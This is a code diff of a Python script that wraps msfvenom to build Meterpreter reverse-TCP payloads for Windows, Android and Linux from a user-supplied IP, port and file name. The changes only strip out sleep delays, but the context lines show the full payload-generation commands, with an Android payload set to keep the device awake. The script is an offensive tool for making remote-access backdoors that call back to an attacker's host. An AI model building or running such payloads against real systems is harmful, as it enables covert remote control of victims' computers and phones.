@@ -1,4 +1,4 @@
-import os, time
+import os
 
 from sys import stdout
 
@@ -9,7 +9,6 @@ def red():
 def green():
     GREEN = "\033[0;32m"
     stdout.write(GREEN)
-
 
 def blue():
     BLUE = "\033[1;34m"
@@ -40,21 +39,15 @@ def main():
 	print("")
 	yellow()
 	print("[+] Ip       -->> "+ip+"")
-	time.sleep(1)
 	print("[+] Port     -->> "+port+"")
-	time.sleep(1)
 	print("[+] Payload  -->> "+payload+"")
-	time.sleep(1)
 	print("[+] FileName -->> "+name+"")
-	time.sleep(1)
-
 
 	if payload == "windows":
 		red()
 		print("")
 		print("[+] Creating payload ...")
 		blue()
-		time.sleep(1)
 		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe >> "+name+".exe 2>/dev/null")
 		print("")
 		print("[+] Payload saved on "+name+".exe")
@@ -83,7 +76,6 @@ def main():
 		red()
 		print("")
 		print("[+] Creating payload ...")
-		time.sleep(1)
 		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" AndroidMeterpreterDebug=true AndroidWakelock=true  -o  "+name+".apk 2>/dev/null")
 		blue()
 		print("")
@@ -113,7 +105,6 @@ def main():
 		red()
 		print("")
 		print("[+] Creating payload ...")
-		time.sleep(1)
 		os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf >> "+name+".elf 2>/dev/null")
 		blue()
 		print("")
